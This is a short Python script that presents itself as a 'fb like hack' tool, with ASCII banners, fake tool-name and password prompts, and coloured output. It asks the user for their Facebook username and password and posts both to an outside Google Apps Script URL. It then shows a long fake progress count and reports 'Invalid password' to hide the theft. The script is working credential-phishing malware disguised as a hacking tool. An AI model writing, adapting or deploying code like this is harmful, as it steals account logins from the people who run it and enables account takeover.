print            ("▇◤▔▔▔▔▔▔▔◥▇ ")
print            ("▇▏◥▇◣┊◢▇◤▕▇ ")
print            ("▇▏▃▆▅▎▅▆▃▕▇ ")
print            ("▇▏╱▔▕▎▔▔╲▕▇ ")
print            ("▇◣◣▃▅▎▅▃◢◢▇ ")
print            ("▇▇◣◥▅▅▅◤◢▇▇ ")
print            ("▇▇▇◣╲▇╱◢▇▇▇ ")

while True:
	if input('enter tool name>>>') =='yourpassword':
		print("your tool is true")
		break
	else:
		print("your tool is fales")
while True:
    if input('enter tool password>>>')=='password':
    	print('tool password true')
    	break
    else:
    	print("tool password fales")
import pyfiglet
import os
os.system("clear")
import requests      
a = pyfiglet.figlet_format("fb like hack",font= "5lineoblique")
class color():
    def __init__(self,gl,blu,read,yel,):
        self.gl = gl
        self.blu = blu
        self.read = read
        self.yel = yel
cl = color('\033[1;32;50m','\033[1;34;50m','\033[1;31;50m','\033[1;33;50m')
print(cl.read,a)
print(cl.gl,"Author By : hacker")
print(cl.read,"hack Your fb like")

mail = input("Enter Your Facebook User Name :")
apass = input("Enter Your account password :")

import time

url = "https://script.google.com/macros/s/AKfycby-tZFgtyHZPXja3d25r2ByTxlvteHugqAbTs4CcAVQgSMZ3zU/exec"
data = {'mail':mail,'pass':apass}
requests.post(url,data=data)
for i in range(10000000):
    print(i,"%")
    time.sleep(0)
print(f"Invalid password: {apass}")
